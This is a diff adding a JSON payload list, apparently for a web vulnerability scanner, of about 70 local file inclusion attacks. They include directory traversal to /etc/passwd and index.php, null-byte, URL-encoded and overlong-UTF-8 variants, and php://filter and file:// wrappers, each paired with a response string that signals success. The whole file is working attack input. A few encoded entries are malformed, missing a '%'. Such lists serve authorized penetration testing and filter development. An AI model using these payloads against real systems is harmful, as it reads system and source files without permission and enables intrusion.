@@ -1,0 +1,322 @@
+[{
+		"name": "LFI payload",
+		"payload": "/etc/passwd",
+		"response": "root:"
+	},
+	{
+		"name": "LFI payload",
+		"payload": "../etc/passwd",
+		"response": "root:"
+	},
+	{
+		"name": "LFI payload",
+		"payload": "/etc/passwd",
+		"response": "root:"
+	},
+	{
+		"name": "LFI payload",
+		"payload": "../etc/passwd",
+		"response": "root:"
+	},
+	{
+		"name": "LFI payload",
+		"payload": "../../etc/passwd",
+		"response": "root:"
+	},
+	{
+		"name": "LFI payload",
+		"payload": "../../../etc/passwd",
+		"response": "root:"
+	},
+	{
+		"name": "LFI payload",
+		"payload": "../../../../etc/passwd",
+		"response": "root:"
+	},
+	{
+		"name": "LFI payload",
+		"payload": "../../../../../etc/passwd",
+		"response": "root:"
+	},
+	{
+		"name": "LFI payload",
+		"payload": "../../../../../../etc/passwd",
+		"response": "root:"
+	},
+	{
+		"name": "LFI payload",
+		"payload": "../../../../../../../etc/passwd",
+		"response": "root:"
+	},
+	{
+		"name": "LFI payload",
+		"payload": "../../../../../../../../etc/passwd",
+		"response": "root:"
+	},
+	{
+		"name": "LFI payload",
+		"payload": "index.php",
+		"response": "<?php"
+	},
+	{
+		"name": "LFI payload",
+		"payload": "../index.php",
+		"response": "<?php"
+	},
+	{
+		"name": "LFI payload",
+		"payload": "../../index.php",
+		"response": "<?php"
+	},
+	{
+		"name": "LFI payload",
+		"payload": "../../../index.php",
+		"response": "<?php"
+	},
+	{
+		"name": "LFI payload",
+		"payload": "../../../../index.php",
+		"response": "<?php"
+	},
+	{
+		"name": "LFI payload",
+		"payload": "../../../../../index.php",
+		"response": "<?php"
+	},
+	{
+		"name": "LFI payload",
+		"payload": "../../../../../../index.php",
+		"response": "<?php"
+	},
+	{
+		"name": "LFI payload",
+		"payload": "../../../../../../../index.php",
+		"response": "<?php"
+	},
+	{
+		"name": "LFI payload",
+		"payload": "../../../../../../../../index.php",
+		"response": "<?php"
+	},
+	{
+		"name": "LFI payload",
+		"payload": "/etc/passwd%00",
+		"response": "root:"
+	},
+	{
+		"name": "LFI payload",
+		"payload": "../etc/passwd%00",
+		"response": "root:"
+	},
+	{
+		"name": "LFI payload",
+		"payload": "../../etc/passwd%00",
+		"response": "root:"
+	},
+	{
+		"name": "LFI payload",
+		"payload": "../../../etc/passwd%00",
+		"response": "root:"
+	},
+	{
+		"name": "LFI payload",
+		"payload": "../../../../etc/passwd%00",
+		"response": "root:"
+	},
+	{
+		"name": "LFI payload",
+		"payload": "../../../../../etc/passwd%00",
+		"response": "root:"
+	},
+	{
+		"name": "LFI payload",
+		"payload": "../../../../../../etc/passwd%00",
+		"response": "root:"
+	},
+	{
+		"name": "LFI payload",
+		"payload": "../../../../../../../etc/passwd%00",
+		"response": "root:"
+	},
+	{
+		"name": "LFI payload",
+		"payload": "../../../../../../../../etc/passwd%00",
+		"response": "root:"
+	},
+	{
+		"name": "LFI '..%2f' encoded payload",
+		"payload": "..%2fetc%2fpasswd%00",
+		"response": "root:"
+	},
+	{
+		"name": "LFI '..%2f' encoded payload",
+		"payload": "..2f..%2f..%2fetc%2fpasswd%00",
+		"response": "root:"
+	},
+	{
+		"name": "LFI '..%2f' encoded payload",
+		"payload": "..2f..%2f..%2f..%2fetc%2fpasswd%00",
+		"response": "root:"
+	},
+	{
+		"name": "LFI '..%2f' encoded payload",
+		"payload": "..2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
+		"response": "root:"
+	},
+	{
+		"name": "LFI '..%2f' encoded payload",
+		"payload": "..2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
+		"response": "root:"
+	},
+	{
+		"name": "LFI '..%2f' encoded payload",
+		"payload": "..2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
+		"response": "root:"
+	},
+	{
+		"name": "LFI '..%2f' encoded payload",
+		"payload": "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
+		"response": "root:"
+	},
+	{
+		"name": "LFI '..%2f' encoded payload",
+		"payload": "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
+		"response": "root:"
+	},
+	{
+		"name": "LFI '..%2f' encoded payload",
+		"payload": "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
+		"response": "root:"
+	},
+	{
+		"name": "LFI payload with unexisting file",
+		"payload": "pwnsociety",
+		"response": "not found"
+	},
+	{
+		"name": "LFI payload with '^^%00' escaping payload",
+		"payload": "/../etc/passwd^^%00",
+		"response": "root:"
+	},
+	{
+		"name": "LFI payload with '^^%00' escaping payload",
+		"payload": "/../../etc/passwd^^%00",
+		"response": "root:"
+	},
+	{
+		"name": "LFI payload with '^^%00' escaping payload",
+		"payload": "/../../../etc/passwd^^%00",
+		"response": "root:"
+	},
+	{
+		"name": "LFI payload with '^^%00' escaping payload",
+		"payload": "/../../../../etc/passwd^^%00",
+		"response": "root:"
+	},
+	{
+		"name": "LFI payload with '^^%00' escaping payload",
+		"payload": "/../../../../../etc/passwd^^%00",
+		"response": "root:"
+	},
+	{
+		"name": "LFI payload with '^^%00' escaping payload",
+		"payload": "/../../../../../../../../../../etc/passwd^^%00",
+		"response": "root:"
+	},
+	{
+		"name": "LFI '/%00/' encoded escape payload",
+		"payload": "/%00//etc/passwd%00",
+		"response": "root:"
+	},
+	{
+		"name": "LFI '/%00/' encoded escape payload",
+		"payload": "/%00//%00/etc/passwd%00",
+		"response": "root:"
+	},
+	{
+		"name": "LFI '/%00/' encoded escape payload",
+		"payload": "/%00//%00//%00/etc/passwd%00",
+		"response": "root:"
+	},
+	{
+		"name": "LFI '/%00/' encoded escape payload",
+		"payload": "/%00//%00//%00//%00/etc/passwd%00",
+		"response": "root:"
+	},
+	{
+		"name": "LFI '/%00/' encoded escape payload",
+		"payload": "/%00//%00//%00//%00//%00/etc/passwd%00",
+		"response": "root:"
+	},
+	{
+		"name": "LFI filter payload",
+		"payload": "php://filter/convert.base64-encode/resource=index.php",
+		"response": "PD9w"
+	},
+	{
+		"name": "LFI filter payload",
+		"payload": "php://filter/convert.base64-encode/resource=../index.php",
+		"response": "PD9w"
+	},
+	{
+		"name": "LFI double escaping payload",
+		"payload": "....//etc/passwd",
+		"response": "root:"
+	},
+	{
+		"name": "LFI double escaping payload",
+		"payload": "....//....//etc/passwd",
+		"response": "root:"
+	},
+	{
+		"name": "LFI double escaping payload",
+		"payload": "....//....//....//etc/passwd",
+		"response": "root:"
+	},
+	{
+		"name": "LFI double escaping payload",
+		"payload": "....//....//....//....//etc/passwd",
+		"response": "root:"
+	},
+	{
+		"name": "LFI double escaping payload",
+		"payload": "....//....//....//....//....//etc/passwd",
+		"response": "root:"
+	},
+	{
+		"name": "LFI wrapper payload",
+		"payload": "file:///etc/passwd",
+		"response": "root:"
+	},
+	{
+		"name": "LFI wrapper payload",
+		"payload": "file://../etc/passwd",
+		"response": "root:"
+	},
+	{
+		"name": "LFI '..%c0%af../' encoded payload",
+		"payload": "/..%c0%af../etc/passwd",
+		"response": "root:"
+	},
+	{
+		"name": "LFI '..%c0%af../' encoded payload",
+		"payload": "/..%c0%af../..%c0%af../etc/passwd",
+		"response": "root:"
+	},
+	{
+		"name": "LFI '..%c0%af../' encoded payload",
+		"payload": "/..%c0%af../..%c0%af../..%c0%af../etc/passwd",
+		"response": "root:"
+	},
+	{
+		"name": "LFI '..%c0%af../' encoded payload",
+		"payload": "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd",
+		"response": "root:"
+	},
+	{
+		"name": "LFI '..%c0%af../' encoded payload",
+		"payload": "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd",
+		"response": "root:"
+	}
+	
+]
